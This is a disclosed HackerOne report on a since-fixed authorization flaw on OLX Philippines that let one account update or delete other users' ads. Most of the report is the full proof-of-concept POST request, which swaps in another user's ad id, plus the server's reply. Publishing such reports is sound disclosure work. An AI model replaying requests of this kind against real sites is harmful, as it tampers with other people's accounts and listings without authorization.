---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150631'
original_report_id: '150631'
title: Updating and Deleting any Ads on OLX Philippines
weakness: Cryptographic Issues - Generic
team_handle: olx
created_at: '2016-07-11T14:43:48.641Z'
disclosed_at: '2016-08-04T07:31:40.836Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cryptographic-issues-generic
---

# Updating and Deleting any Ads on OLX Philippines

## Metadata

- HackerOne Report ID: 150631
- Weakness: Cryptographic Issues - Generic
- Program: olx
- Disclosed At: 2016-08-04T07:31:40.836Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I reported it directly to OLX Philippines they fixed it already but I still want to report it here to gain 7 points.
Here's the original write-up about this issue: https://medium.com/@atom/severe-bug-on-olx-philippines-updating-and-deleting-any-ads-ea6a81a3327a#.r0n5m7em8

I found a Severe Bug on OLX Philippines, it is about changing the details of any User’s Advertisement, but in this proof of concept, I demonstrated how I changed the picture of the target’s advertisement.

Note: I am also able to update any target’s ad info and delete any of their advertisement.

Here are​ the following details on how I found the bug:
I have 2 OLX accounts.
I used the first account to update an advertisement of the 2nd account.
The second account posed as the target.

The HTTP request:
```
POST /index.php/classifieds+management HTTP/1.1
Host: www.olx.ph
Proxy-Connection: keep-alive
Content-Length: 4129
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Origin: http://www.olx.ph
Content-Type: multipart/form-data; boundary= — — WebKitFormBoundaryAknwjb8YFA81jV1x
Referer: http://www.olx.ph/index.php/update+classifieds/id/69191012
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Cookie: [Removed]
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”_qf__adUpdate”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”id”
69191047
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”noHTML”
2
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”categoryType”
5
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”action”
updateAdVerify
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”MAX_FILE_SIZE”
33554432
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”imageFileCounter”
1
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”lat”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”lng”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”_uniqueFormToken”
9e879279d848a425246e967968560e53
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”categoryName”
International
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”categoryId”
44
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”file”; filename=””
Content-Type: application/octet-stream
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”primaryPhoto”
1
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”thumb[1]”
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”image[1]”
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”mobile[1]”
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”imageThumb1″
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”imageThumb2″
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”imageThumb3″
http://allanjaydumanhug.ninja/blog/wp-content/uploads/2015/02/olx.png
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”name”
Anonymous Mask (V Mask)
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”price”
1
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”number”
09xxxxxxxx1
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”longDescription”
(Redacted)
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”location”
Metro Manila
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”address”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”mapsGeoCode”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”jobCheck”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”jobType”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”experience”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”jobTitle”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”salary”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”education”
——WebKitFormBoundaryAknwjb8YFA81jV1x
Content-Disposition: form-data; name=”submit”
Update
——WebKitFormBoundaryAknwjb8YFA81jV1x–
```

The HTTP Response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Sun, 22 Feb 2015 11:14:12 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Keep-Alive: timeout=300
Status: 302 Moved Temporarily
Cache-Control: no-cache, must-revalidate
Expires: Sat, 26 Jul 1997 05:00:00 GMT
Set-Cookie: sulit_lastSelectedCategories=44%2C231; expires=Mon, 22-Feb-2016 11:14:11 GMT; Max-Age=31536000; path=/; domain=.olx.ph
Location: http://www.olx.ph/index.php/view+classifieds/id/69191047/recent/1/Anonymous+Mask+%28V+Mask%29
Access-Control-Allow-Origin: api.sulit.com.ph
Content-Length: 0
```

Thanks,
Allan

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
